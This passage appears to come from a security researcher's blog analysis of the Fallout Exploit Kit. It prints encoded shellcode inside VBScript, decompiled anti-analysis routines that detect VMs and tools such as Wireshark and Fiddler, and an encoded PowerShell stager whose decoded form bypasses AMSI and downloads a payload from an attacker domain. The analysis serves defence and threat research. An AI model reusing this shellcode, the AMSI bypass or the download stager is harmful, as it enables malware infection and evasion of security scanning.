0675%u478B%u5604%uD0FF%u5E5F%u56C3%uF18B%uE856%uFEAB%uFFFF%u8B59%uE8CE%uFF06%uFFFF%u3D5E%u06DE%u3F54%u1F74%u413D%uCD05%u7425%u3D18%u0309%u0F05%u1174%uEC3D%u1803%u7416%u3D0A%u044B%u19F3%u0374%uC033%u33C3%u40C0%u55C3%uEC8B%uEC81%u013C%u0000%u418B%u5308%u5756%uFA8B%uDB33%u518B%u890C%uF855%u518B%u8B10%u1449%u6A53%u8902%uFC55%u4D89%uFFF4%u8BD0%u83F0%uFFFE%u4074%u858D%uFEC8%uFFFF%u85C7%uFEC8%uFFFF%u0128%u0000%u5650%u55FF%u85F8%u74C0%u8D27%uEC8D%uFFFE%uE8FF%uFF6F%uFFFF%uC085%u1575%u858D%uFEC8%uFFFF%u5650%u55FF%u85FC%u75C0%u56E2%u55FF%uEBF4%u3303%u43DB%u1F89%u5E5F%uC95B%u55C3%uEC8B%uEC83%u5310%u5756%uC033%uF98B%u3340%u53C9%uA20F%uF38B%u8D5B%uF05D%u0389%u7389%u8904%u084B%u5389%u8B0C%uF845%uE8C1%u891F%u5F07%u5B5E%uC3C9%u8B55%u81EC%u04EC%u0001%u5300%u3356%u57F6%uC68B%u8488%uFC05%uFFFE%u40FF%u003D%u0001%u7200%u8BF1%u8BDE%u8BFE%u8AF1%u3D94%uFEFC%uFFFF%uC78B%uE083%u0F07%uCAB6%uB60F%u3004%uC303%uC803%uB60F%u8AD9%u1D84%uFEFC%uFFFF%u8488%uFC3D%uFFFE%u47FF%u9488%uFC1D%uFFFE%u81FF%u00FF%u0001%u7200%u8BC8%u0C7D%uF633%uDE8B%uFF85%u5574%u458B%u8908%u0C45%u438D%u0F01%uD8B6%u948A%uFC1D%uFFFE%u0FFF%uC2B6%uC603%uB60F%u8AF0%u3584%uFEFC%uFFFF%u8488%uFC1D%uFFFE%u88FF%u3594%uFEFC%uFFFF%uB60F%u1D8C%uFEFC%uFFFF%uB60F%u03C2%u8BC8%u0C45%uB60F%u8AC9%u0D8C%uFEFC%uFFFF%u0830%u8940%u0C45%uEF83%u7501%u8BB1%u0845%u5E5F%uC95B%u55C3%uEC8B%uEC83%u8B48%u1C45%u4D89%u53F4%u8B56%u8B08%u0870%u4D89%u8BF8%u0448%u4D89%u8BF0%u0C48%u4D89%u8BE8%u1048%u4D89%u8BE0%u1448%u4D89%u8BD8%u1848%u458B%u5714%u046A%u5589%u8BEC%u1850%u4D89%u8BC8%u2448%u458B%u6818%u1000%u0000%u046A%u006A%u388B%u5589%u89D4%uFC4D%u7D89%uFFD0%u6AD2%u8B04%u6AD8%u5300%u5D89%uFFE4%u83D7%u207D%u8D00%u1445%u046A%u5350%u1875%u7D83%u0024%u0975%u45C7%uC614%u90EA%uEB2A%uC71D%u1445%uF9D7%u2A90%u14EB%u7D83%u0024%u45C7%uD214%u90EB%u752A%uC707%u1445%uE4D2%u2A90%u29E8%uFFFC%u8BFF%u084D%u458D%u83C0%u0CC4%u45C7%uF4C0%uDBBC%uC770%uC445%uE14D%u1989%u086A%uE850%uFE76%uFFFF%u5959%uDB33%u458D%u53C0%u5353%u5053%u55FF%u8BF8%u85F8%u75FF%u8B0A%u1045%u1889%u23E9%u0001%u5300%u6A53%u5303%u6853%u01BB%u0000%u75FF%u57F4%u55FF%u8BF0%u89D8%u145D%uDB85%u840F%u00FB%u0000%u4D8B%u8D08%uB845%u086A%uC750%uB845%uC6E5%u1DB0%u45C7%u7CBC%uB9D1%uE819%uFE1C%uFFFF%u5959%uC033%u6850%u3000%u8080%u5050%uFF50%uEC75%u458D%u50B8%uFF53%uE855%uD88B%uDB85%u840F%u00B8%u0000%u046A%u75FF%u6AE4%u6A00%u5300%u55FF%u85E0%u0FC0%uA084%u0000%u8300%u1C65%u8D00%uDC45%u6583%u00DC%u8D50%u1845%u45C7%u0418%u0000%u5000%u458D%u501C%u0568%u0000%u5320%u55FF%u83D8%u187D%u7400%u8376%u1C7D%u7400%u6A70%u6804%u1000%u0000%u75FF%u6A1C%uFF00%uD455%u75FF%u8B1C%u0C4D%u006A%u8950%uFF01%uD055%u6583%u00CC%u458D%u50CC%u458B%uFF0C%u1C75%u30FF%uFF53%uC855%uFF53%uFFD6%u1475%uD6FF%uFF57%u83D6%u207D%u8B00%uFC75%u0474%u006A%uD6FF%u7D83%u0024%u0474%u006A%uD6FF%u458B%uFF0C%u1C75%u4D8B%uFF08%uE830%uFD52%uFFFF%u458B%u5910%uC759%u0100%u0000%uEB00%u5311%uD6FF%u75FF%uFF14%u57D6%uD6FF%u458B%u8310%u0020%u5E5F%uC95B%u55C3%uEC8B%uEC83%u5310%u8B56%u8BF1%u57DA%u7589%uE8FC%uFBF7%uFFFF%uF88B%u43BA%u1C04%u8B19%uE8CF%uFB83%uFFFF%u368B%u75BA%uB905%u8B28%u89CF%u1446%u72E8%uFFFB%u8BFF%uFC75%u51BA%u3209%u8B73%u890E%u1C41%uCF8B%u5EE8%uFFFB%u8BFF%uBA0E%u0614%u33F5%u4189%u8B08%uE8CF%uFB4D%uFFFF%u0E8B%u97BA%u8104%u891D%u8B01%uE8CF%uFB3D%uFFFF%u0E8B%u4DBA%u8505%u8927%u0441%uCF8B%u2CE8%uFFFB%u8BFF%uBA0E%u04E4%u2259%u4189%u8B0C%uE8CF%uFB1B%uFFFF%u0E8B%uD3BA%u7004%u891F%u1041%uCF8B%u0AE8%uFFFB%u8BFF%uBA0E%u047A%u1A1E%u4189%u8B18%uE8CF%uFAF9%uFFFF%u0E8B%uF3BA%u8503%u8915%u2041%uCF8B%uE8E8%uFFFA%u8BFF%u890E%u2441%u58E8%uFFFB%uBAFF%u028C%u08D8%uC88B%uD2E8%uFFFA%u8BFF%u6A0B%u890C%u8D01%uF045%u4D8B%u500C%u45C7%uC2F0%u8DE0%uC720%uF445%uB412%u37CD%u45C7%uEFF8%uF16B%uE8A4%uFC34%uFFFF%u5959%u0E8B%u558D%uE8F0%uFB2B%uFFFF%uF88B%u5DBA%u1006%u8B36%uE8CF%uFA91%uFFFF%u758B%uBA08%u0584%u29FB%u0E8B%u4189%u8B0C%uE8CF%uFA7D%uFFFF%u0E8B%u55BA%uC706%u8935%u1441%uCF8B%u6CE8%uFFFA%u8BFF%uBA0E%u078C%u4B92%u4189%u8B10%uE8CF%uFA5B%uFFFF%u0E8B%u55BA%u6406%u8936%u0841%uCF8B%u4AE8%uFFFA%u8BFF%uBA0E%u051D%u245C%u4189%u8B04%uE8CF%uFA39%uFFFF%u0E8B%u46BA%uC006%u8935%u8B01%uE8CF%uFA29%uFFFF%u0E8B%u5E5F%u895B%u1841%uC3C9%uECD7%u2182%uA319%u2DD6%u29FE%uCBFE%u5CE9%uB27D%u501A%uCF26%u6A47%u54FE%uDABA%u8A85%uEF83%u3361%u09D1%u20F7%u16EC%uD9B7%u917A%uDE1A%u2281%uEA7F%u3143%u6ACE%u1A52%u4FF4%u500B%uC276%u5A57%uC1F8%uE09A%u258F%uA209%u6BCD%u28EE%uE3E7%u2FD5%u8D28%u3568%uAE4A%u0623%u309B%u8E87%uE4E0%u8EF7%u5F02%u7AB4%u73DA%u7483%uB0D2%uBC0E%uB049%u40EE%u8610%u7665%u07AF%u7330%u3C80%u6436%uF745%u5A61%uC1F8%uBBE2%u5581%uF71D%u00A7%u7F8D%u4907%u11AF%uB565%uF4E6%u755E%u19EE%u23AF%u8DB6%uEB89%u2838%u11BF%uC109%u1219%uD17E%uBEEA%uDD49%uF759%u09D6%uEA08%u8E45%uB602%u1B93%u19C4%u9146%uB94D%u9E6C%u0BC7%u00E8%u0000%u5800%uE883%u2D05%u00C0%u0000%u00C3"</span> <span class="o">&amp;</span><span class="n">lIIII</span><span class="p">(</span><span class="n">IIIII</span><span class="p">(</span><span class="s">""</span><span class="p">)))</span>
	<span class="n">IIlI</span><span class="o">=</span><span class="n">IIlI</span> <span class="o">&amp;</span> <span class="kt">String</span><span class="p">((</span><span class="o">&amp;</span><span class="n">h80000</span><span class="o">-</span><span class="n">LenB</span><span class="p">(</span><span class="n">IIlI</span><span class="p">))</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u4141"</span><span class="p">))</span>
	<span class="n">GetShellcode</span><span class="o">=</span><span class="n">IIlI</span>
<span class="k">End</span> <span class="k">Function</span>
</code></pre></div></div>

<p>Let’s read shellcode.</p>

<h2 id="shellcode">Shellcode</h2>
<p>The decoding algorithm in the shellcode has not changed from v3 and remains RC4.
<a href="https://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html">Analysis of Fallout Exploit Kit v3</a></p>

<p>The hash algorithm of API hash has not changed either.
API hashed by the dualaccModFFF1Hash algorithm.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__thiscall</span> <span class="nf">dualaccModFFF1Hash</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// ebx</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// esi</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// ecx</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// edx</span>

  <span class="n">v1</span> <span class="o">=</span> <span class="n">this</span><span class="p">;</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">zz_count</span><span class="p">(</span><span class="n">this</span><span class="p">);</span> <span class="n">i</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">v2</span> <span class="o">+</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="n">v1</span><span class="o">++</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xFFF1</span><span class="p">;</span>
    <span class="n">v2</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="n">v3</span> <span class="o">+</span> <span class="n">v5</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xFFF1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v2</span> <span class="o">+</span> <span class="p">(</span><span class="n">v3</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>However, there were interesting changes.
Analysis environment detection codes has been added in shellcode.</p>

<h3 id="vm-detection">VM Detection</h3>

<p>Query hypervisor precense using CPUID.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__thiscall</span> <span class="nf">zz_vm_detect</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="n">v1</span> <span class="o">=</span> <span class="n">this</span><span class="p">;</span>
  <span class="n">_EAX</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="kr">__asm</span> <span class="p">{</span> <span class="n">cpuid</span> <span class="p">}</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">_ECX</span> <span class="o">&gt;&gt;</span> <span class="mi">31</span><span class="p">;</span>
  <span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="n">_ECX</span> <span class="o">&gt;&gt;</span> <span class="mi">31</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="process-detection">Process Detection</h3>
<p>Get a list of running processes.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/03.jpg" /></p>

<p>Convert process name to lower case.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">zz_tolowercase</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="n">a1</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span> <span class="o">&lt;=</span> <span class="mi">90</span> <span class="p">)</span>
      <span class="o">*</span><span class="n">a1</span> <span class="o">+=</span> <span class="mi">32</span><span class="p">;</span>
    <span class="o">++</span><span class="n">a1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Compare to the following hashes.
Once again, It uses the dualaccModFFF1Hash algorithm.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x3F5406DE
0x25CD0541
0x0F050309
0x161803EC
0x19F3044B
</code></pre></div></div>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/04.jpg" /></p>

<p>Two process names were identified. I do not know the others.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dualaccModFFF1Hash</span><span class="p">(</span><span class="s">"wireshark.exe"</span><span class="p">))</span>
<span class="s">'0x25cd0541'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dualaccModFFF1Hash</span><span class="p">(</span><span class="s">"fiddler.exe"</span><span class="p">))</span>
<span class="s">'0x19f3044b'</span>
</code></pre></div></div>

<p>Like v3, shellcode downloads, decodes and executes encrypted PowerShell code.</p>

<h2 id="powershell">PowerShell</h2>
<p>The PowerShell code to be executed is like this.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="nt">-noni</span><span class="w"> </span><span class="nt">-enc</span><span class="w"> </span><span class="nx">dAByAHkAewAkAGwAMQBJAGwAMQA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQA7ACQAbAAxAEkAbAAxAGwASQAxAEkASQBsAD0AJABsADEASQBsADEALgBHAGUAdABUAHkAcABlACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAFUAMwBsAHoAZABHAFYAdABMAGsAMQBoAGIAbQBGAG4AWgBXADEAbABiAG4AUQB1AFEAWABWADAAYgAyADEAaABkAEcAbAB2AGIAaQA1AEIAYgBYAE4AcABWAFgAUgBwAGIASABNAD0AJwApACkAKQA7ACQASQAxAEkAbAAxADEAbAAxAEkAbAA9ACQAbAAxAEkAbAAxAGwASQAxAEkASQBsAC4ARwBlAHQARgBpAGUAbABkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAFkAVwAxAHoAYQBVAGwAdQBhAFgAUgBHAFkAVwBsAHMAWgBXAFEAPQAnACkAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAkAEkAMQBJAGwAMQAxAGwAMQBJAGwALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AH0AYwBhAHQAYwBoAHsAfQA7AEEAZABkAC0AVAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAIgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwAKQBdAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABJADEAbABJAEkAMQBJAGwAMQB7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAEkAbABJADEAOwBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAbABJAGwAMQBJADEASQBJADEAbAA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkASQBJAEkASQBsAEkASQA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkAbAAxADEAMQBsAEkAbAAxAEkAMQBJADsAfQBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwALABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUAKQBdAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABsAEkAMQBsAGwAMQBJAGwAMQBJADEAbAB7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkASQBJAGwASQA7AHAAdQBiAGwAaQBjACAAcwB0AHIAaQBuAGcAIABJAGwAMQBsADEAOwBwAHUAYgBsAGkAYwAgAHMAdAByAGkAbgBnACAAbABJADEAbABsADsAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAEkAbAAxADEAMQBJAEkASQBsADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAASQAxAGwASQBsADEAbABsADEASQA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkAbABJAEkASQBsADEAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABsAGwAMQAxAEkAbABsADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAASQBsADEASQBsAEkAbAAxADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAbABJAGwASQBJAEkAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABsAEkAMQBsAEkAbABJADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAbABJADEAbAAxADEAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABJAGwAbAAxAEkAbAA7AHAAdQBiAGwAaQBjACAAcwBoAG8AcgB0ACAASQBsAEkASQAxADsAcAB1AGIAbABpAGMAIABzAGgAbwByAHQAIABJAGwAbABJAGwAbAA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABsAGwASQBsAEkAbABJAGwASQA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAGwAbAAxAEkAbABJAGwASQA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAGwAbABJAGwAbABsAEkAMQBJADEAOwBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAASQAxAEkASQBJADsAfQA7AHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABjAGwAYQBzAHMAIABsADEASQBsADEAMQBJAEkASQB7AFsARABsAGwASQBtAHAAbwByAHQAKAAiACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAiACwAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwAoAHMAdAByAGkAbgBnACAASQBJAGwASQBJAEkALABzAHQAcgBpAG4AZwAgAEkAbABJAGwASQAsAEkAbgB0AFAAdAByACAASQAxADEAbAAxAEkALABJAG4AdABQAHQAcgAgAGwAMQBsAEkAMQAsAGIAbwBvAGwAIABJAGwASQAxADEASQBJADEAMQAxADEALAB1AGkAbgB0ACAAbAAxADEAMQBJACwASQBuAHQAUAB0AHIAIABsAEkASQBJADEASQBsAGwASQAsAHMAdAByAGkAbgBnACAASQAxAEkAbAAxAGwASQAsAHIAZQBmACAAbABJADEAbABsADEASQBsADEASQAxAGwAIABsAGwAMQAxAEkASQBsADEASQAsAG8AdQB0ACAASQAxAGwASQBJADEASQBsADEAIABsAEkASQAxAEkASQApADsAfQAiADsAJABsAGwAbAAxAEkAbABsAEkAMQA9ACIAJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwATABvAHcAXAAkACgALQBqAG8AaQBuACgAKAA0ADgALgAuADUANwApACsAKAA2ADUALgAuADkAMAApACsAKAA5ADcALgAuADEAMgAyACkAfABHAGUAdAAtAFIAYQBuAGQAbwBtACAALQBDAG8AdQBuAHQAIAA4AHwAJQB7AFsAYwBoAGEAcgBdACQAXwB9ACkAKQAuAHQAbQBwACIAOwAkAEkAMQBsADEAMQBJADEAPQAnAGgAdAB0AHAAOgAvAC8AYgBlAGEAaABlAHIAbwA0AHUALgBjAG8AbQAvADEAOQA1ADAALQAwADEALQAxADEALwBPADgAWgByACcAOwBbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcASgBHAE4AcwBhAFQAMABvAFQAbQBWADMATABVADkAaQBhAG0AVgBqAGQAQwBCAE8AWgBYAFEAdQBWADIAVgBpAFEAMgB4AHAAWgBXADUAMABLAFQAcwBrAFkAMgB4AHAATABrAGgAbABZAFcAUgBsAGMAbgBOAGIASgAxAFYAegBaAFgASQB0AFEAVwBkAGwAYgBuAFEAbgBYAFQAMABuAFMAagBVADMAVQBEAGwANQBNAFcAawB6AE0ARQAwAHgATQBEAEoAWQBOAFMAYwA3AEoARwBOAHMAYQBTADUARQBiADMAZAB1AGIARwA5AGgAWgBFAFoAcABiAEcAVQBvAEoARQBrAHgAYgBEAEUAeABTAFQARQBzAEoARwB4AHMAYgBEAEYASgBiAEcAeABKAE0AUwBrADcAJwApACkAfABpAGUAeAA7ACQASQAxAEkAMQBsADEASQBJAGwAbABJADEAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAbABJADEAbABsADEASQBsADEASQAxAGwAOwAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxAC4ASQBsAEkASQAxAD0AMAB4ADAAOwAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxAC4ASQBJAEkAbABJAD0AWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoAUwBpAHoAZQBPAGYAKAAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxACkAOwAkAEkASQBsADEASQBsADEASQA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJADEAbABJAEkAMQBJAGwAMQA7AFsAbAAxAEkAbAAxADEASQBJAEkAXQA6ADoAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwAoACQAbABsAGwAMQBJAGwAbABJADEALAAkAGwAbABsADEASQBsAGwASQAxACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAJABmAGEAbABzAGUALAAwAHgAMAAwADAAMAAwADAAMAA4ACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAIgBjADoAIgAsAFsAcgBlAGYAXQAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxACwAWwByAGUAZgBdACQASQBJAGwAMQBJAGwAMQBJACkAfABvAHUAdAAtAG4AdQBsAGwAOwA</span><span class="o">=</span><span class="w">
</span></code></pre></div></div>

<p>Let’s decode and clean.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$l1Il1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="p">;</span><span class="w">
    </span><span class="nv">$l1Il1lI1IIl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$l1Il1</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s2">"System.Management.Automation.AmsiUtils"</span><span class="p">);</span><span class="w">
    </span><span class="nv">$I1Il11l1Il</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$l1Il1lI1IIl</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s2">"amsiInitFailed"</span><span class="p">,</span><span class="w"> </span><span class="s1">'NonPublic,Static'</span><span class="p">);</span><span class="w">
    </span><span class="nv">$I1Il11l1Il</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="bp">$true</span><span class="p">);</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">};</span><span class="w">

</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-TypeDefinition</span><span class="w"> </span><span class="s2">"using System;using System.Diagnostics;using System.Runtime.InteropServices;[StructLayout(LayoutKind.Sequential)]public struct I1lII1Il1{public IntPtr IIlI1;public IntPtr lIl1I1II1l;public uint IIIIIlII;public uint Il111lIl1I1I;}[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]public struct lI1ll1Il1I1l{public uint IIIlI;public string Il1l1;public string lI1ll;public string Il111IIIl;public uint I1lIl1ll1I;public uint IlIIIl1;public uint ll11Ill;public uint Il1IlIl1;public uint lIlIII;public uint lI1lIlI;public uint lI1l11;public uint Ill1Il;public short IlII1;public short IllIll;public IntPtr llIlIlIlI;public IntPtr Ill1IlIlI;public IntPtr IllIlllI1I1;public IntPtr I1III;};public static class l1Il11III{[DllImport(""kernel32.dll"",SetLastError=true)]public static extern bool CreateProcess(string IIlIII,string IlIlI,IntPtr I11l1I,IntPtr l1lI1,bool IlI11II1111,uint l111I,IntPtr lIII1IllI,string I1Il1lI,ref lI1ll1Il1I1l ll11IIl1I,out I1lII1Il1 lII1II);}"</span><span class="p">;</span><span class="w">

</span><span class="nv">$lll1IllI1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="s2">\AppData\LocalLow\</span><span class="si">$(</span><span class="o">-join</span><span class="p">((</span><span class="mi">48</span><span class="o">..</span><span class="mi">57</span><span class="si">)</span><span class="s2">+(65..90)+(97..122)|Get-Random -Count 8|%{[char]</span><span class="bp">$_</span><span class="s2">})).tmp"</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1l11I1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'http://beahero4u.com/1950-01-11/O8Zr'</span><span class="p">;</span><span class="w">
</span><span class="nv">$cli</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">);</span><span class="w">
</span><span class="nv">$cli</span><span class="o">.</span><span class="n">Headers</span><span class="p">[</span><span class="s1">'User-Agent'</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'J57P9y1i30M102X5'</span><span class="p">;</span><span class="w">
